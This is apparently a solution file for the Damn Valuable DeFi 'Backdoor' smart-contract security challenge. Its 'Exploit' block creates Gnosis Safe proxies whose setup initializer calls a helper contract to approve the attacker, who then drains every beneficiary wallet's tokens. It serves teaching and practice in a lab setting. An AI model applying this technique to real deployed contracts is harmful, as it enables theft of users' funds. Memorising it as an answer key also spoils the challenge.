const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("[Challenge] Backdoor", function () {
    let deployer, users, attacker;

    const AMOUNT_TOKENS_DISTRIBUTED = ethers.utils.parseEther("40");

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address];

        // Deploy Gnosis Safe master copy and factory contracts
        this.masterCopy = await (await ethers.getContractFactory("GnosisSafe", deployer)).deploy();
        this.walletFactory = await (await ethers.getContractFactory("GnosisSafeProxyFactory", deployer)).deploy();
        this.token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy();

        // Deploy the registry
        this.walletRegistry = await (
            await ethers.getContractFactory("WalletRegistry", deployer)
        ).deploy(this.masterCopy.address, this.walletFactory.address, this.token.address, users);

        // Users are registered as beneficiaries
        for (let i = 0; i < users.length; i++) {
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be.true;
        }

        // Transfer tokens to be distributed to the registry
        await this.token.transfer(this.walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        const TOKEN_PAYMENT = ethers.utils.parseEther("10");

        this.walletRegistryAbuser = await (await ethers.getContractFactory("WalletRegistryAbuser", deployer)).deploy();

        const safeABI = [
            "function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver) returns (bool)",
        ];
        const safeInterface = new ethers.utils.Interface(safeABI);

        const exploitData = this.walletRegistryAbuser.interface.encodeFunctionData("exploit", [
            this.token.address,
            attacker.address,
        ]);

        for (const user of [alice, bob, charlie, david]) {
            const initializer = safeInterface.encodeFunctionData("setup", [
                [user.address],
                1,
                this.walletRegistryAbuser.address,
                exploitData,
                "0x0000000000000000000000000000000000000000",
                "0x0000000000000000000000000000000000000000",
                "0",
                "0x0000000000000000000000000000000000000000",
            ]);

            await this.walletFactory
                .connect(attacker)
                .createProxyWithCallback(this.masterCopy.address, initializer, 0, this.walletRegistry.address, {
                    gasLimit: 1000000,
                });

            const proxy = await this.walletRegistry.wallets(user.address);
            await this.token.connect(attacker).transferFrom(proxy, attacker.address, TOKEN_PAYMENT);
        }
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        for (let i = 0; i < users.length; i++) {
            let wallet = await this.walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            expect(wallet).to.not.eq(ethers.constants.AddressZero, "User did not register a wallet");

            // User is no longer registered as a beneficiary
            expect(await this.walletRegistry.beneficiaries(users[i])).to.be.false;
        }

        // Attacker must have taken all tokens
        expect(await this.token.balanceOf(attacker.address)).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
